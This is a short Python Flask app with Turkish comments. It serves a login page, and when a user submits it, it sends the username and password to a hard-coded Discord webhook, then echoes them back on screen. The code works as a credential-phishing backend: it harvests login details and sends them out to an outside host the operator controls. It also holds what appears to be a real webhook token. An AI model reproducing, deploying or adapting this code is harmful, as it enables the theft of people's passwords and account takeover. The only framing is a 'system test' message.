import os
import requests
from flask import Flask, render_template, request

app = Flask(__name__)

# Discord Webhook URL'ni buraya eksiksiz yapıştır
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1389197903364362334/PDjw-rxZ1n2OIT2tmMoObfMQtznuhrUT5evwUayhIpz1YAaEnUU_psuI0_SepNCdP29k"

@app.route('/')
def index():
    return render_template('login.html') 

@app.route('/login', methods=['POST'])
def login():
    user = request.form.get('username')
    pw = request.form.get('password')

    # 1. Discord'a Gönder (Kontrolü basitleştirdik)
    if DISCORD_WEBHOOK_URL.startswith("https://"):
        try:
            data = {
                "content": f"🔔 **Sistem Testi Başarılı**\n**Kullanıcı:** {user}\n**Şifre:** {pw}"
            }
            requests.post(DISCORD_WEBHOOK_URL, json=data)
        except Exception as e:
            print(f"Hata: {e}")

    # 2. Yönlendirme YAPMA, ekrana yazı yazdır
    return f"Sistem Test Edildi. Alınan Veri: {user} / {pw}. Bu bilgiler su an Discord'una ulasmis olmali."

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
